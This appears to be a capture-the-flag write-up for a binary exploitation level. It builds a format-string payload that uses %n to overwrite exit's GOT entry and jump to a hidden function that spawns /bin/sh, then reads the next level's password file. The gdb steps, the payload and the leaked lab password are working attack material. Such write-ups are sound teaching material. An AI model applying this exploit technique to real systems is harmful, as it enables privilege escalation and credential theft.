### Download binary
``scp -P4242 level5@192.168.31.170:/home/user/level5/level5 ~/Desktop/``

----

### Decompilation with ghidra
We disasemble the main, to search for a breach.

----

### Main function analysis (see sources)
There's a piece of dead code, the o function.
This one opens a **system("/bin/sh")**, so, our goal is to execute it.
``fgets`` is size protected to prevent buffer overflow, buffer's size is 520, the limit is set to 512.
We have to attack the Global Offset Table, which is a table that store pointer to function of the program.

----

### Building the payload

We want to build this payload :
**exit ADRESS (GOT) + o ADRESS + PLACE OF OUR INPUT IN STACK + %n**

``gdb level5``

**Getting the o function adress :**
``(gdb) info functions``
>[...]
0x080484a4  o

**Getting GOT adress range :**
``(gdb) info files``
>[...]
0x08049818 - 0x08049840 is .got.plt

**Let's find the function we want to overwrite, exit() :**
``(gdb) x/16wx 0x08049818``
>0x8049818 <_GLOBAL_OFFSET_TABLE_>:	0x0804974c	0x00000000	0x00000000	0x08048386
[...]
0x8049838 <exit@got.plt>:	0x080483d6	0x080483e6	0x00000000	0x00000000
[...]

**As usual we make a payload to see where we can put our adress.**
``python -c "print 'AAAA' + ' %x '*4" | ./level5``
>AAAA 200  b7fd1ac0  b7ff37d0  41414141

So, our final payload is :
python -c "print '\x38\x98\x04\x08' + '%134513824u' + '%4\$n'" > /tmp/payload

Why 134513824 ? Because o function adress is 0x080484a4, 0x080484a4 in decimal = 134513828.
We substract 4, for the first 4th bytes of the adress we wrote -> 134513828 - 4 = 134513824 !

----

#### Getting the flag

``cat /tmp/payload5 - | ./level5``

>[lot of spaces]
512

``whoami``
>level6

``cat /home/user/level6/.pass``
>d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
